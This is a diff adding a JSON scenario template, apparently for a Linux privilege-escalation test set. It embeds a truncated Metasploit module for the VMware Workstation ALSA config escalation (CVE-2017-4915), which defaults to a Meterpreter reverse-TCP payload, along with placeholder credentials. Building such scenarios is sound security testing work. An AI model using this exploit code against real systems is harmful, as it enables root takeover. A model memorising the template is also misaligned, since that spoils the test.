@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_43449",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: VMware Workstation - ALSA Config File Local Privilege Escalation (Metasploit)\n\nExploit source code (43449.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VMware Workstation ALSA Config File Local Privilege Escalation',\n      'Description'    => %q{\n        This module exploits a vulnerability in VMware Workstation Pro and\n        Player on Linux which allows users to escalate their privileges by\n        using an ALSA configuration file to load and execute a shared object\n        as root when launching a virtual machine with an attached sound card.\n\n        This module has been tested successfully on VMware Player version\n        12.5.0 on Debian Linux.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2017-4915' ],\n          [ 'EDB', '42045' ],\n          [ 'BID', '98566' ],\n          [ 'URL', 'https://gist.github.com/bcoles/cd26a831473088afafefc93641e184a9' ],\n          [ 'URL', 'https://www.vmware.com/security/advisories/VMSA-2017-0009.html' ],\n          [ 'URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1142' ]\n        ],\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jann Horn', # Discovery and PoC\n          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit\n        ],\n      'DisclosureDate' => 'May 22 2017',\n      'Platform'       => 'linux',\n      'Targets'        =>\n        [\n          [ 'Linux x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Linux x64', { 'Arch' => ARCH_X64 } ]\n        ],\n      'DefaultOptions' =>\n        {\n          'Payload'     => 'linux/x64/meterpreter_reverse_tcp',\n          'WfsDelay'    => 30,\n          'PrependFork' => true\n        },\n      'DefaultTarget'  => 1,\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Privileged'     => true ))\n    register_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def has_prereqs?\n    vmplayer = cmd_exec 'which vmplayer'\n    if vmplayer.include? 'vmplayer'\n      vprint_good 'vmplayer is installed'\n    else\n      print_error 'vmplayer is not installed. Exploitation will fail.'\n      return false\n    end\n\n    gcc = cmd_exec 'which gcc'\n    if gcc.include? 'gcc'\n      vprint_good 'gcc is installed'\n    else\n      print_error 'gcc is not installed. Compiling will fail.'\n      return false\n    end\n\n    true\n  end\n\n  def check\n    unless has_prereqs?\n      print_error 'Target missing prerequisites'\n      return CheckCode::Safe\n    end\n\n    begin\n      config = read_file '/etc/vmware/config'\n    rescue\n      config = ''\n    end\n\n    if config =~ /player\\.product\\.version\\s*=\\s*\"([\\d\\.]+)\"/\n      @version = Gem::Version.new $1.gsub(/\\.$/, '')\n      vprint_status \"VMwa\n```",
+  "cve": "",
+  "exploitdb_id": "43449",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_43449",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
